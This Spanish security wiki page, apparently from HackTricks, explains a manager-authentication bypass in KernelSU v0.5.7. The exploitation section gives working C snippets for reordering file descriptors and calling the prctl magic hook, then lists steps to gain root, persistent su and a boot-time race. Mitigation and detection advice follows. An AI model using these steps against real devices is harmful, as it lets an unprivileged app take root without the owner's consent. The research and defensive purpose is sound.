# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

Los frameworks de rooting como KernelSU, APatch y SKRoot parchean o hookean el kernel de Android/Linux y exponen funcionalidad privilegiada a una app manager en userspace sin privilegios. Magisk se analiza por separado a continuación porque CVE-2024-48336 implicaba la carga de código en el lado del manager, en lugar de este syscall path de KernelSU.<sup>[[1]](#references)[[5]](#references)[[13]](#references)</sup>

Esta página abstrae las técnicas y los problemas descubiertos en investigaciones públicas (especialmente el análisis de KernelSU v0.5.7 de Zimperium) para ayudar a los equipos red y blue a comprender las superficies de ataque, las primitivas de explotación y las mitigaciones robustas.<sup>[[1]](#references)</sup>

---
## Patrón de arquitectura: canal del manager hookeado por syscall

- En KernelSU v0.5.7, un kernel hook sobre `prctl` recibe un valor mágico, un ID de comando y argumentos específicos del comando desde userspace.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
- El caller solicita primero el estado del manager con `CMD_BECOME_MANAGER`. La autorización es específica para cada comando: `CMD_GRANT_ROOT` comprueba el estado del manager/allowlist, `CMD_ALLOW_SU` es exclusivo del manager y `CMD_SET_SEPOLICY` requiere root en esta versión.<sup>[[2]](#references)[[11]](#references)</sup>
- Otros comandos consultan la versión/configuración o informan de eventos del framework.<sup>[[2]](#references)</sup>
- Como cualquier app puede invocar esta interfaz de syscall, la corrección de la autenticación del manager es crítica.<sup>[[1]](#references)[[2]](#references)</sup>

Ejemplo (diseño de KernelSU):
- Syscall hookeado: prctl
- Valor mágico para redirigir al handler de KernelSU: 0xDEADBEEF
- Los comandos incluyen: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT, etc.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

---
## Flujo de autenticación de KernelSU v0.5.7 (tal como está implementado)

Cuando userspace llama a prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...), KernelSU verifica:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

1) Comprobación del prefijo del path
- El path proporcionado debe comenzar con un prefijo esperado para el UID del caller, por ejemplo, /data/data/<pkg> o /data/user/<id>/<pkg>.
- Referencia: lógica del prefijo del path en core_hook.c (v0.5.7).<sup>[[2]](#references)</sup>

2) Comprobación de ownership
- El path debe pertenecer al UID del caller.
- Referencia: lógica de ownership en core_hook.c (v0.5.7).<sup>[[2]](#references)</sup>

3) Comprobación de la firma del APK mediante un escaneo de la tabla de FD
- Iterar los file descriptors abiertos del proceso caller en orden creciente de descriptor.
- Para cada archivo regular cuyo path comience por `/data/app/` y termine en `/base.apk`, exigir que el path contenga el substring del package derivado del data-directory path proporcionado.
- Verificar la firma del primer candidato que supere esas comprobaciones del path.
- Analizar la firma APK v2 y verificarla contra el certificado oficial del manager.
- Referencias: manager.c (iteración de FDs), apk_sign.c (verificación APK v2).<sup>[[3]](#references)[[4]](#references)</sup>

Si todas las comprobaciones tienen éxito, el kernel almacena temporalmente en caché el UID del manager; los comandos exclusivos del manager aceptan entonces ese UID, mientras que los demás comandos conservan su propio UID o sus comprobaciones de allowlist.<sup>[[2]](#references)[[3]](#references)</sup>

---
## Clase de vulnerabilidad: confiar en la selección del APK derivada del path

KernelSU v0.5.7 no vincula el resultado de la firma con la identidad del package instalado por PackageManager. En `manager.c`, la comprobación del package es únicamente una comprobación de substring del path (`strstr(cwd, pkg)`); después se comprueba la firma del primer candidato que supera ese test. Por tanto, un atacante puede colocar un APK de manager legítimo bajo un path `/data/app/` que también contenga el nombre del package del atacante y hacer que sea seleccionado primero.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>

Esta confianza por indirección permite a una app sin privilegios suplantar al manager sin poseer su signing key.<sup>[[1]](#references)</sup>

Propiedades clave explotadas:<sup>[[1]](#references)[[3]](#references)</sup>
- El escaneo de FD está ordenado por índice de descriptor y la comprobación del package es un test de substring del path, no un binding verificado entre package y APK.
- open() devuelve el FD disponible con el número más bajo. Al cerrar primero los FDs con números inferiores, un atacante puede controlar el orden.
- Un APK de manager incluido en la app puede colocarse bajo `/data/app/` en un path que contenga el string del package del atacante, conservando a la vez la firma oficial del manager.

---
## Precondiciones del ataque

El caso concreto de KernelSU v0.5.7 requiere:<sup>[[1]](#references)[[3]](#references)</sup>

- El dispositivo ya está rooteado con un framework de rooting vulnerable (por ejemplo, KernelSU v0.5.7).
- El atacante puede ejecutar código local arbitrario sin privilegios (proceso de una app Android).
- Para la implementación v0.5.7, `current->real_parent` debe tener UID 0 (el comentario del source lo describe como un requisito de hijo directo de zygote); `manager.c` rechaza otros parents.<sup>[[3]](#references)</sup>
- El manager real aún no se ha autenticado (por ejemplo, justo después de un reboot). Algunos frameworks almacenan en caché el UID del manager después de una autenticación exitosa; hay que ganar la race.<sup>[[1]](#references)</sup>

---
## Esquema de explotación (KernelSU v0.5.7)

Pasos de alto nivel (el vídeo de demo citado muestra la prueba de concepto pública en funcionamiento):<sup>[[1]](#references)[[2]](#references)[[10]](#references)</sup>
1) Construir un path válido hasta el directorio de datos de tu propia app para satisfacer las comprobaciones de prefijo y ownership.
2) Colocar un base.apk legítimo de KernelSU Manager bajo `/data/app/` en un path que contenga el string de tu package y abrirlo en un FD con un número inferior al de tu propio base.apk.
3) Invocar prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...) para superar las comprobaciones.
4) Usar `CMD_GRANT_ROOT` y después `CMD_ALLOW_SU` para obtener su persistente; invocar `CMD_SET_SEPOLICY`, exclusivo de root, únicamente después de obtener root y solo donde sea compatible.

Notas prácticas sobre el paso 2 (orden de los FD):<sup>[[1]](#references)</sup>
- Identificar el FD de tu proceso correspondiente a tu propio /data/app/*/base.apk recorriendo los symlinks de /proc/self/fd.
- Cerrar un FD bajo (por ejemplo, stdin, fd 0) y abrir primero el APK legítimo del manager para que ocupe fd 0 (o cualquier índice inferior al FD de tu propio base.apk).
- Incluir el APK legítimo del manager en tu app para que su path comience por `/data/app/`, termine en `/base.apk` y contenga el string de tu package. Por ejemplo, un path bajo el directorio `lib` de tu app puede satisfacer estas comprobaciones.<sup>[[1]](#references)[[3]](#references)</sup>

Ejemplos de fragmentos de código (Android/Linux, solo con fines ilustrativos):

Enumerar los FDs abiertos para localizar entradas base.apk:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Fuerza a un FD de número inferior a apuntar al APK legítimo del manager:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Autenticación del Manager mediante el hook `prctl` de KernelSU v0.5.7:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 1  // KernelSU v0.5.7; other frameworks differ

int become_manager(const char *my_data_dir) {
uint32_t reply = 0;
// arg3: data path; arg4: unused; arg5: userspace result pointer
(void)prctl(KSU_MAGIC, CMD_BECOME_MANAGER,
(unsigned long)my_data_dir, 0UL,
(unsigned long)&reply);
return reply == KSU_MAGIC ? 0 : -1;
}
```
Tras el éxito, comandos privilegiados (ejemplos):<sup>[[2]](#references)[[11]](#references)</sup>
- CMD_GRANT_ROOT: promote current process to root
- CMD_ALLOW_SU: add your package/UID to allowlist for persistent su
- CMD_SET_SEPOLICY: adjust SELinux policy after obtaining root; KernelSU v0.5.7 checks for UID 0 for this command.<sup>[[2]](#references)</sup>

Consejo de race/persistence:
- Register a BOOT_COMPLETED receiver in AndroidManifest (`RECEIVE_BOOT_COMPLETED`) to start after reboot and attempt authentication before the real manager; the permission authorizes receipt of `ACTION_BOOT_COMPLETED` but does not itself guarantee scheduling priority.<sup>[[1]](#references)[[12]](#references)</sup>

---
## Orientación sobre detección y mitigación

Para desarrolladores de frameworks:
- Vincula la autenticación al package/UID del caller, no a FDs arbitrarios:
- Resolve the caller’s package from its UID and verify against the installed package’s signature (via PackageManager) rather than scanning FDs.
- If kernel-only, use stable caller identity (task creds) and validate on a stable source of truth managed by init/userspace helper, not process FDs.
- Evita las comprobaciones de prefijos de rutas como identidad; el caller puede satisfacerlas trivialmente.
- Usa challenge–response basado en nonce a través del canal y elimina cualquier identidad de manager almacenada en caché durante el boot o ante eventos clave.
- Considera IPC autenticada basada en binder en lugar de sobrecargar syscalls genéricas cuando sea viable.

Para defenders/blue team:
- Detecta la presencia de rooting frameworks y procesos de manager; monitoriza llamadas a prctl con magic constants sospechosas (por ejemplo, 0xDEADBEEF) si tienes telemetría del kernel.<sup>[[1]](#references)[[11]](#references)</sup>
- En flotas gestionadas, bloquea o genera alertas ante boot receivers de packages no confiables que intenten rápidamente comandos privilegiados del manager después del boot.
- Asegúrate de que los dispositivos estén actualizados a versiones parcheadas del framework; invalida los IDs de manager almacenados en caché tras una actualización.

Limitaciones del ataque:<sup>[[1]](#references)[[2]](#references)</sup>
- Solo afecta a dispositivos que ya tienen root mediante un framework vulnerable.
- Normalmente requiere un reboot/race window antes de que el manager legítimo se autentique (algunos frameworks almacenan en caché el UID del manager hasta que se restablece).

---
## Notas relacionadas entre frameworks

- La autenticación basada en password (por ejemplo, builds históricos de APatch/SKRoot) puede ser débil si las passwords se pueden adivinar o aplicar bruteforce, o si las validaciones contienen errores.<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- La autenticación basada en package/signature (por ejemplo, KernelSU) es más sólida en principio, pero debe vincularse al caller real, no a artefactos derivados de rutas seleccionados mediante escaneos de FD.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- Magisk: CVE-2024-48336 afectó a builds anteriores a Canary 27007 que cargaban código desde un package GMS no verificado, lo que permitía a una app local ejecutar código en la app de Magisk y escalar a root sin interacción del usuario.<sup>[[8]](#references)[[9]](#references)[[13]](#references)</sup>

---
## References

- [1] [Zimperium – El rooting de todo mal: fallos de seguridad que podrían comprometer tu dispositivo móvil](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [2] [KernelSU v0.5.7 – comprobaciones de autenticación de core_hook.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L149-L205)
- [3] [KernelSU v0.5.7 – iteración de FD, comprobación de package y llamada de signature en manager.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L16-L67)
- [4] [KernelSU v0.5.7 – verificación de APK v2 en apk_sign.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/apk_sign.c#L6-L119)
- [5] [Proyecto KernelSU](https://kernelsu.org/)
- [6] [APatch](https://github.com/bmax121/APatch)
- [7] [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [8] [Problema n.º 8279 de Magisk – verificar que GMS sea una app del sistema](https://github.com/topjohnwu/Magisk/issues/8279)
- [9] [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [10] [Vídeo de demostración de KSU PoC (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)
- [11] [KernelSU v0.5.7 – identificadores de comandos de ksu.h](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/ksu.h#L12-L24)
- [12] [Android Manifest.permission.RECEIVE_BOOT_COMPLETED](https://developer.android.com/reference/android/Manifest.permission#RECEIVE_BOOT_COMPLETED)
- [13] [NVD – CVE-2024-48336](https://nvd.nist.gov/vuln/detail/CVE-2024-48336)
{{#include ../../banners/hacktricks-training.md}}
